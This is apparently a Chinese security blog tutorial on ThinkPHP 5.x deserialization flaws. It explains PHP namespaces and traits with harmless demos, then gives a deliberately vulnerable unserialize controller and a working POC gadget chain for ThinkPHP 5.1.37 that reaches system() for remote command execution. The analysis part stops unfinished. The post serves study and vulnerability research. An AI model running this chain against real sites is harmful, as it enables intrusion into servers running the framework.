<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>ThinkPHP5.x反序列化漏洞全复现 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="ThinkPHP5.x反序列化漏洞全复现 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-02T09:31:00.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">ThinkPHP5.x反序列化漏洞全复现</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="嗯、说在前面"><a href="#嗯、说在前面" class="headerlink" title="嗯、说在前面"></a>嗯、说在前面</h1><p>最近在学Java，但是回过头看PHP发现还有一些框架没有去深究，比如这个ThinkPHP，然后虽然网上很多poc，但那也只是poc，你不知道流程和构造链单纯知道个反序列化，我改点东西不就没了<br>然后也是发现其实网上的文章大部分讲的也不是很好，甚至有一些错误，这里我就边学习边纠正，尽量是能让新人也能够看懂ThinkPHP反序列化漏洞和一些RCE链子<br>然后在学习之前确保你有以下基础：</p>
<blockquote>
<p>因为这些是基础中的基础</p>
</blockquote>
<ul>
<li><input checked="" disabled="" type="checkbox"> PHP语言</li>
<li><input checked="" disabled="" type="checkbox"> PHP反序列化漏洞</li>
<li><input checked="" disabled="" type="checkbox"> PHP命令执行</li>
<li><input checked="" disabled="" type="checkbox"> 一定的耐心</li>
<li><input checked="" disabled="" type="checkbox"> IDEA中PHP代码动态调试</li>
</ul>
<h1 id="一、基础知识-PHP中的namespace"><a href="#一、基础知识-PHP中的namespace" class="headerlink" title="一、基础知识 | PHP中的namespace"></a>一、基础知识 | PHP中的namespace</h1><p>namespace实际上就是命名空间，在php类与对象这一章节中用到了命名空间这个概念，我也是没有看到这个考点出现在比赛题中，并且也没有一些文章去透彻的分析它，因此这是一个比较重要的基础知识点，我在这里就给他总结一下</p>
<h2 id="（1）命名空间和子命名空间"><a href="#（1）命名空间和子命名空间" class="headerlink" title="（1）命名空间和子命名空间"></a>（1）命名空间和子命名空间</h2><p>我们可以把namespace理解为一个单独的空间，事实上它也就是一个空间而已，子命名空间那就是空间里再划分几个小空间，这样说很抽象，我举几个例子来理解：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">animal</span>\<span class="title class_">cat</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;meow&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">animal</span>\<span class="title class_">dogA</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dog</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;A:wooffff&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">animal</span>\<span class="title class_">dogB</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;B:wooffff&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">dog</span>();</span><br><span class="line"><span class="comment">//下面输出的都是dogA</span></span><br><span class="line"><span class="keyword">new</span> \animal\dogA\<span class="title function_ invoke__">dog</span>();</span><br><span class="line"><span class="keyword">use</span> <span class="title">animal</span>\<span class="title">dogA</span>;</span><br><span class="line"><span class="keyword">new</span> dogA\<span class="title function_ invoke__">dog</span>();</span><br><span class="line"><span class="keyword">use</span> <span class="title">animal</span>\<span class="title">dogA</span> <span class="keyword">as</span> <span class="title">alias</span>;</span><br><span class="line"><span class="keyword">new</span> alias\<span class="title function_ invoke__">dog</span>();</span><br><span class="line"><span class="comment">//输出cat</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">animal</span>\<span class="title">cat</span>\<span class="title">cat</span>;</span><br><span class="line"><span class="keyword">new</span> <span class="title function_ invoke__">cat</span>();</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677401972123-fd14dab9-edd3-49fe-b519-828d7cf0387a.png#averageHue=%23212321&clientId=u2e562b51-b2cd-4&from=paste&height=231&id=ua50e72ef&name=image.png&originHeight=289&originWidth=1840&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=680882&status=done&style=none&taskId=uf07d30dd-22d1-4dcf-bad6-29d30c2798b&title=&width=1472" alt="image.png"><br>在上面的例子中<code>animal</code>是一个命名空间，<code>animal\cat animal\dogA animal\dogB</code>都是其子命名空间，可以看到这样一共就存在三个命名空间，而使用各个命名空间的方法就是将命名空间的名字写完整<br>而use是什么意思呢？其实和include和require有点像，就是在当前命名空间引入其他命名空间的别名，比如<code>use animal\dogA as alias</code>其中的alias就是别名。<code>use animal\cat\cat</code>这句话就是直接指定了animal\cat命名空间的cat类了，我们只需要直接new就可以创建cat对象，不需要在前面加命名空间</p>
<h2 id="（2）类的继承"><a href="#（2）类的继承" class="headerlink" title="（2）类的继承"></a>（2）类的继承</h2><p>这其实不是namespace里的知识，但是由于见的比较少，所以放在这里一起讲了，PHP类的继承是通过<code>extend</code>关键字来实现的，这里也比较简单，看一个例子就知道了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">father</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Json&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>=<span class="number">30</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hobby</span>=<span class="string">&quot;game&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i am father \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">smoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i got smoke \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">son</span> <span class="keyword">extends</span> <span class="title">father</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Boogipop&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$age</span>=<span class="number">19</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;i am son \n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parentsay</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::<span class="title function_ invoke__">say</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$son</span>=<span class="keyword">new</span> <span class="title function_ invoke__">son</span>();</span><br><span class="line"><span class="variable">$son</span>-&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line"><span class="variable">$son</span>-&gt;<span class="title function_ invoke__">smoke</span>();</span><br><span class="line"><span class="variable">$son</span>-&gt;<span class="title function_ invoke__">parentsay</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$son</span>-&gt;hobby;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677402743662-ed7769bb-adb8-43d6-835f-8a9646f6ce8c.png#averageHue=%231f211f&clientId=u2e562b51-b2cd-4&from=paste&height=166&id=u5103543c&name=image.png&originHeight=208&originWidth=1802&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=496288&status=done&style=none&taskId=u34096b16-4709-4054-b39e-a14953dbc1d&title=&width=1441.6" alt="image.png"><br>上述例子中son继承了father，可以看到属性和方法也被继承下来了，子类可以覆盖父类的方法，子类也可以通过<code>parent::</code>关键字访问父类被覆盖的方法，一个很简单的demo</p>
<h2 id="（3）trait修饰符"><a href="#（3）trait修饰符" class="headerlink" title="（3）trait修饰符"></a>（3）trait修饰符</h2><p>这是本节的重中之重了，trait修饰符使得被修饰的类可以进行复用，增加了代码的可复用性，使用这个修饰符就可以在一个类包含另一个类，具体也是可以看下面几个例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;test\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">impl</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;impl\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title function_ invoke__">impl</span>();</span><br><span class="line"><span class="variable">$t</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677427884426-f38ed9ca-5c9d-4426-9196-ffab93edf7dd.png#averageHue=%231f211f&clientId=u1a42d8fb-4cd6-4&from=paste&height=108&id=u347c87c5&name=image.png&originHeight=135&originWidth=1649&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=299139&status=done&style=none&taskId=u408bd65a-ce28-4339-bce3-e067cd043bb&title=&width=1319.2" alt="image.png"><br>我们在impl类中use了test这个类，因此我们可以调用其中的方法，是不是有点像类的继承了，大致意思就是这么个情况<br>然后这个修饰符也有个好玩的地方，看下面另一个demo：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">np1</span>\<span class="title class_">A</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">np2</span>\<span class="title">A</span>\<span class="title">Kino</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Boogipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Kino</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;dawn_construct\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">np2</span>\<span class="title class_">A</span>;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;np1.php&quot;</span>);</span><br><span class="line"><span class="keyword">use</span> <span class="title">np1</span>\<span class="title">A</span>\<span class="title">Boogipop</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Kino</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;tostring\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">boogipop</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677428029637-0d401358-1ae3-4810-b3af-85c255a4c8d9.png#averageHue=%23212322&clientId=u1a42d8fb-4cd6-4&from=paste&height=142&id=ubb083058&name=image.png&originHeight=177&originWidth=1822&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=430175&status=done&style=none&taskId=ub3550a9a-3f6a-4c48-b09b-15620b1b0ba&title=&width=1457.6" alt="image.png"><br>可以看到由于我们在Boogipop类里面复用了Kino这个类，因此我们一并触发了其tostring方法，这个在tp5反序列化漏洞中也有出现，因此我提一嘴</p>
<h1 id="二、ThinkPHP开发手册"><a href="#二、ThinkPHP开发手册" class="headerlink" title="二、ThinkPHP开发手册"></a>二、ThinkPHP开发手册</h1><p>给我好好地学一下ThinkPHP的一些规则</p>
<h1 id="三、ThinkPHP5-1-x反序列化链"><a href="#三、ThinkPHP5-1-x反序列化链" class="headerlink" title="三、ThinkPHP5.1.x反序列化链"></a>三、ThinkPHP5.1.x反序列化链</h1><h2 id="（1）环境搭建"><a href="#（1）环境搭建" class="headerlink" title="（1）环境搭建"></a>（1）环境搭建</h2><ul>
<li>PHP7.3+Xdebug+thinkphp5.1.37+IDEA</li>
</ul>
<p>该反序列化漏洞属于二次触发漏洞，需要有一个入口，因此我们将控制器中的Index控制器修改一下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$input</span>=<span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ThinkPHP5_Unserialize:\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$input</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;ThinkPHP5&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里面准备了一个unserialize反序列化入口</p>
<h2 id="（2）POC-效果展示"><a href="#（2）POC-效果展示" class="headerlink" title="（2）POC+效果展示"></a>（2）POC+效果展示</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;boogipop&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;boogipop&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;boogipop&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>POC看起来很短，而分析起来（确实很短），拿到结果后直接在url中命令执行即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677429172101-b43a154e-e149-4823-9dff-9398c0874390.png#averageHue=%23999999&clientId=u1a42d8fb-4cd6-4&from=paste&height=719&id=u5c193417&name=image.png&originHeight=899&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=133161&status=done&style=none&taskId=uf9a1faf0-7863-4959-bae0-4462593bf90&title=&width=1536" alt="image.png"></p>
<h2 id="（3）触发链分析"><a href="#（3）触发链分析" class="headerlink" title="（3）触发链分析"></a>（3）触发链分析</h2><blockquote>
<ul>
<li><input checked="" disabled="" type="checkbox"> 2023-2-27-0-35：今天玩了一天有点累了，明天再继续写吧</li>
</ul>
</blockquote>
